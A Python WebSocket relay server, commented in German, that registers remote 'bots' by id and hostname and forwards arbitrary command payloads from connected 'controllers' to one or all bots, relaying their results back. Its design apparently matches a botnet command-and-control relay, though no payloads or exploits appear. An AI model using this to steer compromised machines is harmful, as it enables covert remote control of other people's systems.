import asyncio
import websockets
import json
import time
from colorama import init, Fore, Style

init(autoreset=True)

bots = {}  # Bots die mit VPS verbunden sind
controllers = []  # Controller die verbunden sind


async def broadcast_to_bots(msg):
    """Leitet Befehl an Bots weiter"""
    if not bots:
        return False

    target = msg.get("target", "all")
    targets = list(bots.keys()) if target == "all" else [target] if target in bots else []

    for bot_id in targets:
        try:
            await bots[bot_id]["ws"].send(json.dumps({
                "type": "command",
                "task_id": msg.get("task_id"),
                "data": {
                    "type": msg.get("action"),
                    "payload": msg.get("payload")
                }
            }))
            print(f"{Fore.CYAN}→ Weitergeleitet an Bot {bot_id}{Style.RESET_ALL}")
        except:
            pass
    return len(targets) > 0


async def handler(websocket, path=None):
    try:
        # Erste Nachricht prüfen ob Bot oder Controller
        first_msg = await websocket.recv()
        data = json.loads(first_msg)

        if data.get("type") == "register" and "info" in data:  # Bot
            bot_id = data["bot_id"]
            hostname = data["info"].get("hostname", "Unknown")
            bots[bot_id] = {"ws": websocket, "hostname": hostname, "last_seen": time.time()}
            print(f"{Fore.GREEN}✅ Bot verbunden: {bot_id} | {hostname}{Style.RESET_ALL}")

            async for message in websocket:
                msg = json.loads(message)
                if msg["type"] == "result":
                    # Ergebnis an alle Controller weiterleiten
                    for ctrl in controllers[:]:
                        try:
                            await ctrl.send(json.dumps(msg))
                        except:
                            controllers.remove(ctrl)

        elif data.get("type") == "controller":  # Controller
            controllers.append(websocket)
            print(f"{Fore.MAGENTA}🖥️ Controller verbunden{Style.RESET_ALL}")

            async for message in websocket:
                msg = json.loads(message)
                if msg["type"] == "command":
                    await broadcast_to_bots(msg)

    except Exception as e:
        print(f"Verbindung geschlossen: {e}")
    finally:
        # Cleanup
        if websocket in controllers:
            controllers.remove(websocket)
        for bid, info in list(bots.items()):
            if info["ws"] == websocket:
                print(f"{Fore.RED}❌ Bot getrennt: {bid}{Style.RESET_ALL}")
                del bots[bid]


async def main():
    async with websockets.serve(handler, "0.0.0.0", 8765):
        print(f"{Fore.GREEN}🚀 VPS Relay Server läuft auf ws://0.0.0.0:8765{Style.RESET_ALL}")
        await asyncio.Future()


if __name__ == "__main__":
    asyncio.run(main())